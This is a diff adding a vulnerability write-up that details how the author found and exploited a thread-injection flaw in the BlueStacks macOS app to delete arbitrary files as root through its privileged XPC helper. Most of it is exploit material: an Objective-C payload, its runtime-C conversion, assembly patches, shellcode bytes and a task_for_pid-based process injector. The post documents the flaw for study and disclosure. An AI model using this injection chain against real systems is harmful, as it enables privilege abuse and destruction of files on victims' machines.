@@ -1,0 +1,342 @@
+## Arbitrary File Delete in BlueStacks (CVE-2021-XXXX)
+This post will detail how I discovered and exploited CVE-2021-XXXX to gain a arbitrary file delete as root in BlueStacks. 
+
+The vulnerability was that the application had the entitlement 'get-task-allow' allowing other applications to inject threads into the running process, which allows an attacker to make arbitrary XPC calls to the privledged service that the program interacts with because the privledged service authenticates the incoming connection based on the code signature of the binary that is coming from. A thread injection vulnerablity (such as get-task-allow) allows us to pass these checks whilst still running arbitary code.  
+
+To exploit this vulnerablity and gain arbitrary file delete we are going to write Objective-C runtime based shellcode payload to interact with the XPC service as the process that we are injecting into has low privledges. This shellcode will call a function using XPC that deletes arbitrary files as root, in the examples used we will delete /tmp/xpc_test.
+
+#### Discovering the Vulnerability 
+One of the first things I do when I review a MacOS application is check the entitlements that the application has because that defines how you can interact with the application and what the application can interact with. To do this you run 
+```
+codesign -dv --entitlements :- /binary_image_path/'
+```
+Running this on /Applications/BlueStacks.app/Contents/MacOS/BlueStacks shows that it has the following notable entitlements.
+```bash
+<dict>
+	<true/>
+	<key>com.apple.security.cs.allow-dyld-environment-variables</key>
+	<true/>
+	<key>com.apple.security.cs.allow-jit</key>
+	<true/>
+	<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
+	<true/>
+	<key>com.apple.security.cs.debugger</key>
+	<true/>
+	<key>com.apple.security.cs.disable-executable-page-protection</key>
+	<true/>
+	<key>com.apple.security.cs.disable-library-validation</key>
+	<key>com.apple.security.get-task-allow</key>
+	<true/>
+</dict>
+</plist>
+```
+
+The following two entitlements allow us to inject and run arbitrary libraries that are unsigned into the process, we will use these entitlements to debug the Objective-C runtime code that we write and test our initial Objective-C shellcode.
+
+```bash
+com.apple.security.cs.allow-dyld-environment-variables
+com.apple.security.cs.disable-library-validation
+```
+The following entitlement is what allows us to start remote threads in the process.
+```bash
+com.apple.security.get-task-allow
+```
+#### Finding Interesting Functionality 
+Now that we discovered that we can start remote threads in the process we need to see what we can do with those threads. Because the application runs with low privledges we will look at the privledged service that it interacts with. 
+
+To dump the protocols that the privledged helper service (com.BlueStacks.AppPlayer.bstservice_helper) supports we use class-dump, filtering through the class-dump output we will find the below protocol definition for HelperIpcProtocol that the Bluestacks application uses modify certain properties of files on the disk. 
+```objc
+@protocol HelperIpcProtocol
+- (void)die;
+- (void)loadModulesWithContinuation:(void (^)(BOOL))arg1;
+- (void)fixQuarantineAttributeAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)fixLaunchAgentsWithContinuaion:(void (^)(BOOL))arg1;
+- (void)fixBundlePermissionsAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)placeVBoxInLibrary:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)placeVirtualBoxApp:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)removeBundleAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)environmentWithContinuation:(void (^)(NSDictionary *))arg1;
+- (void)identifyWithContinuation:(void (^)(unsigned int, unsigned int))arg1;
+- (void)pingWithContinuation:(void (^)(void))arg1;
+- (void)setLogger:(NSObject<HelperIpcLoggerProtocol> *)arg1;
+@end
+```
+Looking at the functionality of removeBundleAtPath we can see that it allows an attacker to remove files from anywhere on the host after checking that the binary that is making the XPC request is allowed to make the request. Below is the functionality of the function with the logging moved. 
+
+
+```objc
+void HelperIpcServiceConnection::removeBundleAtPath:continuation:
+               (ID param_1,SEL param_2,ID filePath,ID param_4,undefined4 param_5)
+{
+    if(HelperIpcServiceConnection::clientAuthorized)
+    {
+        InstallerHelper *helper = [InstallerHelper alloc];
+        [helper removeBundleAtPath:filePath]
+    }
+}
+```
+```objc
+char InstallerHelper::removeBundleAtPath:(ID param_1,SEL param_2,ID filePath)
+{
+    BOOL return_value = YES;
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+    if([fileManager fileExistsAtPath:filePath])
+    {
+        if([fileManager removeItemAtPath:filePath error:nil] == NO)
+        {
+            return_value = NO
+        }
+    }
+    return return_value;
+}
+```
+
+```objc
+char HelperIpcServiceConnection::clientAuthorized(ID param_1,SEL param_2)
+{
+    BOOL ret_value = NO
+    char path_buffer[4096];
+    proc_id = [_connection processIdentifier];
+    pid_path = proc_pid_patch(proc_id, path_buffer, 0x1000);
+    if(pid_path != 0)
+        NSString* str = [NSString stringWithUTF8String:path_buffer];
+        NSURL* nsurl = [NSURL fileURLWithPath:str];
+        long staticCode;
+        result_code = SecStaticCodeCreateWithPath(nsurl, 0, &staticCode);
+        if(result_code = 0)
+        {
+            result_code = SecRequirementCreateWithStringAndErrors
+            (&cf_anchorapplegenericand(certificateleaf[field.1.2.840.113635.100.6.1.9]/*exists*/orcertificate1[field.1.2.840.113635.100.6.2.6]/*exists*/andcertificateleaffield.1   .2840.113635.100.6.1.13]/*exists*/andcertificateleaf[subject.OU]=QX5T8D6EDU),0,&local_1040,&local_1048);
+            if(result_code)
+            {
+                return_value = SecStaticCodeCheckValidityWithErrors(local_1050,0,local_1048,&local_1040);
+                if(return_value)
+                {
+                    ret_value = YES
+                    return ret_value
+                }
+            }
+        }
+    }
+    return ret_value
+}
+```
+
+#### Initial Shellcode
+The below is the Objective-C shellcode that we are going to covert into C using the Objective-C runtime library. It simply deletes the file at '/tmp/xpc_test' as root.  
+```objc
+#import <Foundation/Foundation.h> 
+#import <Security/Authorization.h>
+
+@protocol HelperIpcProtocol
+- (void)fixQuarantineAttributeAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)fixLaunchAgentsWithContinuaion:(void (^)(BOOL))arg1;
+- (void)fixBundlePermissionsAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+- (void)removeBundleAtPath:(NSString *)arg1 continuation:(void (^)(BOOL))arg2;
+@end
+
+__attribute__((constructor)) static void run(int argc, const char **argv) {
+	
+    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.BlueStacks.AppPlayer.bstservice_helper" options:NSXPCConnectionPrivileged];
+                                                       
+    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperIpcProtocol)];
+    connection.interruptionHandler = ^{
+        NSLog(@"Connection Terminated");
+    };
+
+    connection.invalidationHandler = ^{
+        NSLog(@"Connection Invalidated");
+    };
+
+    NSString* path = @"/tmp/xpc_test";
+	
+    [connection resume];
+    [connection.remoteObjectProxy removeBundleAtPath:path continuation:^(BOOL error) {}];
+}
+```
+#### Converting To Objective-C Runtime Code
+We now need to convert the Objective-C code we have to  C based Objective-C runtime code. At the same time we will also patch out all the functions we need to so we can dynamically resolve them at run time. In the end we only need to resolve dlopen, dlsym and pthread_create_from_mach_thread for the code and _NSConcreteGlobalBlock for the objective-c block type.
+
+### Writing the Objective-C Runtime Code 
+
+The following is a explanation of each block of Objective-C run time code. 
+
+open the Foundation Framework, we need this framework in our threads enviornment so that we can interaction with Foundation objects (such as NSStrings)
+
+```c                                                    
+void *sdl_library = dlopen("/System/Library/Frameworks/Foundation.framework/Versions/Current/Foundation", 0x1);
+```
+Setup the NSAutoreleasePool so that we can use objects th require interact with the NSAutoreleasePool.
+```c
+// Set up an NSAutoreleasePool
+Class nsautoreleasepool = objc_getClass("NSAutoreleasePool");
+id pool = class_createInstance(nsautoreleasepool, 0);
+id poolAfterInit = set_selector_msgsend(pool, sel_registerName("init"));
+```
+Create the NSString that represents the mach service name that we are going to be interacting with("com.BlueStacks.AppPlayer.bstservice_helper").
+```c
+// Setup NSString
+id mach_service_name = (id)objc_getClass("NSString");
+int NSUTF8StringEncoding = 4;
+id tmp = set_selector_msgsend(mach_service_name, sel_registerName("alloc"));
+id text = set_nssttring_with_c_string_type_msgsend(tmp, sel_registerName("initWithCString:encoding:"), "com.BlueStacks.AppPlayer.bstservice_helper", NSUTF8StringEncoding);
+```
+Create the XPC connection object and initialize it with the mach service name of the previous NSString("com.BlueStacks.AppPlayer.bstservice_helper") and pass the NSXPCConnectionPrivileged constant which indicates we are communicating with a privledged service. 
+```c
+//  setup the NSXPCConnection 
+Class nsxpcconection = objc_getClass("NSXPCConnection");
+id connection_test = class_createInstance(nsxpcconection,0);
+id conn_ptr = set_string_int_msgsend(connection_test, sel_registerName("initWithMachServiceName:options:"), text, 0x1000);
+```
+Get a instance of the protocol that we are interacting with (HelperIpcprotocol).
+```c
+//  define the protocol 
+Protocol* helper_ipc_protocol_ptr = objc_getProtocol("HelperIpcProtocol");
+```
+Create the XPC connection and set the protcol to helper_ipc_protocol_ptr. 
+```c
+//  setup the NSXPCInterface
+id nsxpcinterface = (id)objc_getClass("NSXPCInterface");
+printf("nsxpcinterface ptr %p\n", nsxpcinterface);
+id interface_ptr = set_proto_ptr_msgsend(nsxpcinterface, sel_registerName("interfaceWithProtocol:"), helper_ipc_protocol_ptr);
+```
+Set the interface on the connection to the be the interface created with the HelperIpcProtocol protocol.
+```c
+//  set the remote object interface to interface_ptr
+set_interface_ptr_msgsend(conn_ptr, sel_registerName("setRemoteObjectInterface:"), interface_ptr);
+```
+Create the NSString for the parameter to the function("/tmp/xpc_test")
+```c
+//  resume the connection
+set_selector_msgsend(conn_ptr, sel_registerName("resume"));
+id file_to_delete = (id)objc_getClass("NSString");
+NSUTF8StringEncoding = 4;
+tmp = set_selector_msgsend(file_to_delete, sel_registerName("alloc"));
+text = set_nssttring_with_c_string_type_msgsend(tmp, sel_registerName("initWithCString:encoding:"), "/tmp/xpc_test", NSUTF8StringEncoding);
+```
+Create the block that we will use as a callback to the XPC connection.
+```c
+void (^simpleBlock)(bool) = ^(bool test) {};
+```
+Set the remote function to call ("removeBundleAtPath:continuation:"), pass the parameters (NSString "/tmp/xpc_test") and the callback handler (simpleBlock), then make the XPC call.
+```c
+//  get the remote object proxy 
+id remote_object_proxy = set_selector_msgsend(conn_ptr, sel_registerName("remoteObjectProxy"));
+set_remote_object_proxy_msgsend(remote_object_proxy, sel_registerName("removeBundleAtPath:continuation:"), text, simpleBlock);
+```
+#### Patching The Code
+We compile this code with clang and check that it works by injecting the compiled dylib into the process to make sure that our Objective-C runtime code is correct. Once that is done we need to patch the following pointers at run time for the callback block (simpleblock).
+- arg_descriptor_ptr 
+- main_block_invoke_ptr 
+- block_descriptor_tmp_ptr
+
+We are going to do this using a small amount of assembly that will be prepended to the payload. 
+```asm
+#patch the main_block_invoke_ptr
+leaq 	0xFE4(%rip), %rdi 
+leaq	L_.main_block_invoke(%rip), %rsi 
+movq	%rsi, (%rdi) 
+
+#patch the block_descriptor_tmp_ptr
+leaq 	0xFDB(%rip), %rdi 
+leaq	0xF9C(%rip), %rsi 
+movq	%rsi, (%rdi)
+
+#patch arg_descriptor_ptr
+leaq 	0xFA2(%rip), %rdi 
+leaq	L_.str.21(%rip), %rsi 
+movq	%rsi, (%rdi)
+```
+Once we have finished patching the assembly we will compile it and then dump the objects code and data. We will seperate the data into data that needs to have read/write permissions (to patch pointer values) and data that only needs to have read permissions.
+
+The data that just needs to read permissions will go into the code section and the data that needs read/write  permissions will go into the data section. 
+
+before we can actually run our thread and call dlopen/dlsym we need add a small bit of code that 'promotes' the mach thread we just created into a pthread that can make all syscalls to do this we are going to modify the code created by Scott Knight(https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)and append our shellcode to the end.
+
+```asm
+"\x90"                            // nop
+"\x55"                            // push       rbp
+"\x48\x89\xE5"                    // mov        rbp, rsp
+"\x48\x83\xEC\x10"                // sub        rsp, 0x10
+"\x48\x8D\x7D\xF8"                // lea        rdi, qword [rbp+var_8]       
+"\x31\xC0"                        // xor        eax, eax
+"\x89\xC1"                        // mov        ecx, eax                     
+"\x48\x8D\x15\x21\x00\x00\x00"    // lea        rdx, qword ptr [rip + 0x21]  
+"\x48\x89\xCE"                    // mov        rsi, rcx                     
+"\x48\xB8"                        // movabs     rax, pthread_create_from_mach_thread
+"__PTRD__"						  
+"\xFF\xD0"			  // call       rax
+"\x89\x45\xF4"                    // mov        dword [rbp+var_C], eax
+"\x48\x83\xC4\x10"                // add        rsp, 0x10
+"\x5D"                            // pop        rbp
+"\x48\xc7\xc0\x13\x0d\x00\x00"    // mov        rax, 0xD13
+"\xEB\xFE"                        // jmp        0x0
+"\xC3"                            // ret
+"\x90"				  // nop
+```
+#### Writing The Injector
+Once this done we need to write up a injector to inject code and data into the remote process and then start a thread, using task_for_pid, thread_create_running and the mach_vm_* family of functions.
+
+get a mach_port for the process by looking up the PID and calling task_for_pid()
+```c
+kern_return_t kr = task_for_pid(current_task(), bluestacksPID, &remoteTask);
+```
+using that mach_port we will allocate data, code and stack page in the process using mach_vm_allocate(). 
+```c
+kr = mach_vm_allocate( remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+kr = mach_vm_allocate( remoteTask, &remoteData64, DATA_SIZE, VM_FLAGS_ANYWHERE);
+```
+we will write to the data and code pages using mach_vm_write(). 
+```c
+kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t) injectedCode, CODE_SIZE);
+kr = mach_vm_write(remoteTask, remoteData64, (vm_address_t) injectedData, DATA_SIZE);
+
+```
+we will change the permissions of these pages using vm_protect()
+```c
+kr  = vm_protect(remoteTask, remoteData64, DATA_SIZE, FALSE, VM_PROT_READ | VM_PROT_WRITE);
+kr  = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+```
+we will memset the remote thread state structure 
+```c
+x86_thread_state64_t remoteThreadState64;
+thread_act_t remoteThread;
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
+```
+we then setup the values needed to point to our injected code using the remoteThreadState64 structure.
+```c
+remoteStack64 += (STACK_SIZE / 2);
+const char* p = (const char*) remoteCode64;
+remoteThreadState64.__rip = (u_int64_t) (vm_address_t) remoteCode64;
+remoteThreadState64.__rsp = (u_int64_t) remoteStack64;
+remoteThreadState64.__rbp = (u_int64_t) remoteStack64;
+```
+we then launch or remote thread using thead_create_running().
+```c
+kr = thread_create_running( remoteTask, x86_THREAD_STATE64,(thread_state_t) &remoteThreadState64, x86_THREAD_STATE64_COUNT, &remoteThread );
+```
+We will also dynamically resolve the symbols we need and write a small function to patch the shellcode automatically.
+
+```c
+void find_and_replace_symbol(char* symbol, void* replace)
+{
+	uint8_t* ptr = &replace; 
+	for(int i = 0; i < CODE_SIZE; i++) 
+	{
+		if(memcmp(symbol, injectedCode+i, 8) == 0)
+		{
+			for(int j = 0; j < 8; j++) 
+			{ 
+				injectedCode[i+j] = ptr[j];
+			}
+		}
+	}
+}
+```
+```c
+void * libpthread_handle = dlopen("/usr/lib/system/libsystem_pthread.dylib", RTLD_LAZY);
+void * libpthread_ptr = dlsym(libdpthread_handle, "pthread_create_from_mach_thread");
+find_and_replace_symbol("__PTRD__", libpthread_ptr);
+```
